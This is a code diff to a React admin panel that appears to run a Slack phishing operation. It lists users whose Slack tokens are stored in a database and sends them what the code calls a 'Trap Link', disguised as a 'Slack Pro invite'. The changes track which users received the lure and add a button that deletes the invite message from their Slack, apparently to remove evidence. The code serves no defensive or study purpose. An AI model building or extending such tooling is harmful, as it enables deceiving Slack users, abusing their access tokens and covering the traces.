@@ -6,7 +6,7 @@
 import React, { useEffect, useState } from 'react';
 import { db } from '@/lib/firebase';
 import { collection, onSnapshot } from 'firebase/firestore';
-import { Send, User, MessageSquare, Shield, Link as LinkIcon, Lock, AlertCircle, Trash2, Edit, Image as ImageIcon, X, Check, Paperclip } from 'lucide-react';
+import { Send, User, MessageSquare, Shield, Link as LinkIcon, Lock, AlertCircle, Trash2, Edit, Image as ImageIcon, X, Check, Paperclip, Mail, Ban } from 'lucide-react';
 import { convertEmojis } from '@/utils/emojiConverter';
 
 export default function DMManager() {
@@ -25,7 +25,11 @@ export default function DMManager() {
 
   useEffect(() => {
     const unsub = onSnapshot(collection(db, "slack_tokens"), (snap) => {
-      setConnectedUsers(snap.docs.map(d => ({ id: d.id, ...d.data() })));
+      setConnectedUsers(snap.docs.map(d => ({ 
+        id: d.id, 
+        ...d.data(),
+        hasInvite: !!d.data().inviteMessageTs // Check if user has an invite message
+      })));
     });
     return () => unsub();
   }, []);
@@ -87,6 +91,13 @@ export default function DMManager() {
         if(data.success) {
             setInviteStatus({ msg: '✅ Trap Link Sent!', type: 'success' });
             setInviteId('');
+            
+            // Update local state to show invite was sent
+            setConnectedUsers(prev => prev.map(user => 
+              user.id === inviteId.trim() 
+                ? { ...user, hasInvite: true }
+                : user
+            ));
         } else {
             setInviteStatus({ msg: `❌ Error: ${data.error}`, type: 'error' });
         }
@@ -109,6 +120,37 @@ export default function DMManager() {
         method: 'POST',
         body: JSON.stringify({ action: 'delete_user', targetUserId: userId })
     });
+  };
+
+  const deleteInviteMessage = async (userId: string, e: React.MouseEvent) => {
+    e.stopPropagation();
+    if(!confirm("Delete the Slack Pro invite message from this user's Slack?")) return;
+    
+    try {
+      const res = await fetch('/api/slack/manager', {
+        method: 'POST',
+        body: JSON.stringify({
+          action: 'delete_invite_message',
+          targetUserId: userId
+        })
+      });
+      
+      const data = await res.json();
+      if(data.success) {
+        // Update local state
+        setConnectedUsers(prev => prev.map(user => 
+          user.id === userId 
+            ? { ...user, hasInvite: false }
+            : user
+        ));
+        
+        alert('✅ Invite message deleted from Slack!');
+      } else {
+        alert(`❌ Error: ${data.error}`);
+      }
+    } catch (error) {
+      alert('❌ Failed to delete invite message');
+    }
   };
 
   const deleteMessage = async (messageTs: string) => {
@@ -275,16 +317,36 @@ export default function DMManager() {
                             <div className="overflow-hidden">
                                 <div className="font-medium text-sm truncate">{u.name}</div>
                                 <div className="text-[10px] opacity-60 truncate">{u.id}</div>
+                                {u.hasInvite && (
+                                    <div className="text-[10px] text-green-400 flex items-center gap-1 mt-1">
+                                        <Mail className="h-3 w-3" />
+                                        Invite Sent
+                                    </div>
+                                )}
                             </div>
                         </div>
                         
-                        <button 
-                            onClick={(e) => handleDeleteUser(u.id, e)}
-                            className="p-1.5 rounded-md hover:bg-red-500/20 text-gray-600 hover:text-red-400 opacity-0 group-hover:opacity-100 transition-all"
-                            title="Remove User"
-                        >
-                            <Trash2 className="h-4 w-4" />
-                        </button>
+                        <div className="flex gap-1">
+                            {/* Delete Invite Button - Only shows if invite was sent */}
+                            {u.hasInvite && (
+                                <button 
+                                    onClick={(e) => deleteInviteMessage(u.id, e)}
+                                    className="p-1.5 rounded-md hover:bg-yellow-500/20 text-yellow-500 hover:text-yellow-400 opacity-0 group-hover:opacity-100 transition-all"
+                                    title="Delete Invite Message"
+                                >
+                                    <Ban className="h-4 w-4" />
+                                </button>
+                            )}
+                            
+                            {/* Delete User Button */}
+                            <button 
+                                onClick={(e) => handleDeleteUser(u.id, e)}
+                                className="p-1.5 rounded-md hover:bg-red-500/20 text-gray-600 hover:text-red-400 opacity-0 group-hover:opacity-100 transition-all"
+                                title="Remove User"
+                            >
+                                <Trash2 className="h-4 w-4" />
+                            </button>
+                        </div>
                     </div>
                 ))}
             </div>
